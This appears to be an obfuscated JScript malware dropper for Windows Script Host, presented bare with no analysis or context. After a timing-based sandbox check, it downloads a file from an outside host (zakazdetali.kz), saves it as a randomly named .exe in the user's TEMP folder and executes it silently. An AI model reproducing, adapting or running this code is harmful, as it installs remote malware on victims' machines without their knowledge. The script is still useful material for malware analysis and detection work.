var _EA = false;
var _NF = "CreateObject";
var _NW = function _M0() {return WScript[_NF]("WScript"+".Shell");}(), _W0 = 11;
var _UV = "MSXML2.XMLHTTP";
var _F0 = 2123213;
var _XS = 0;
function _X(_T){_NW["Run"](_T, _XS, _XS);};
function _F(){return _UV + "";};
function _AG(_I, _M2){_XS = _XS * 1; return _I - _M2;};
function _G(){return _NF;};
/*@cc_on
  @if (@_win32 || @_win64)
    _EA = true;
  @end
@*/
if (_EA)
{
var _A = "";
function _O(){return 22;};
var _M1 = 0; var _AE = 0;
function _Y()
{
var _T0 = new this["Date"]();
var _VD = _T0["getUTCMilliseconds"]();
WScript["Sleep"](_O());
var _T0 = new this["Date"]();
var _QU = _T0["getUTCMilliseconds"]();
WScript["Sleep"](_O());
var _T0 = new this["Date"]();
var _B = _T0["getUTCMilliseconds"]();
var _M1 = "_GW";
_M1 = _AG(_QU, _VD);
var _AE = "_XD";
_AE = _AG(_B, _QU);
_A = "open";
return _AG(_M1, _AE);
}
var _VY = false;
var _LL = false;
for (var _R = _XS; _R < _O() * 1; _R++){if (_Y() != _XS){
_VY = true; 
_AE = "31" + 11 * _M1 + _AE; 
_LL = true; 
break;
}}
function _M() {return ((_VY == true) && (_VY == _LL)) ? 1 : _XS;};
if (_VY && _M() && _LL){
function _VC() {return _NW["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "CWEFcqcR5XmYQ.ex" + "e";};
 _JG = _F();
 _Y0 = WScript[_NF](_JG);
 var _A0 = 1;
 while (_A0){
try {
	if (_A0 == 1)
	{
		_Y0[_A]("GET", "http://zakazdetali.kz/v7bsad", false);
		_Y0["send"]();
		_W = "Sleep";
	}
	WScript[_W](_O() + 120); 
	if (_Y0["readystate"] < 2 * 2) continue;
	_A0 = _XS;
	function _VP(_O0) {var _PK = (1, 2, 3, 4, 5, _O0); return _PK;};
	_WI = WScript[_G()]("ADODB.Stream");
	_JG = _WI;
	_JG[_A]();
	_JG["type"] = _VP(1);
	_JG["write"](_Y0["ResponseBody"]);
	_WI["position"] = _VP(_XS);
	_JG["Save" + "ToFile"](_VC(), 2);
	_WI["cl"+"ose"]();
	_RN = _VC();
	_X(_RN);
} catch(_P){};
}
}
}

